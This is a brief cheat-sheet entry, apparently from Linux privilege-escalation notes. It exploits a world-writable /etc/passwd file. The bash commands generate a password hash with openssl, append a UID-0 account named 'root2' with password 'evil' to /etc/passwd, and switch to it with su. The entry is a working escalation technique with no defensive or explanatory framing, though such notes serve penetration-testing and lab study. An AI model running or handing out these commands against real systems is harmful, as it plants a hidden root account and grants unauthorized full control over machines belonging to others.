### Bad Permission
writable /etc/passwd

```bash
openssl passwd evil

echo 'root2:1DrTbIWRDbpz.:0:0:root:/root:/bin/bash' >> /etc/passwd

su root2 #pass: evil
```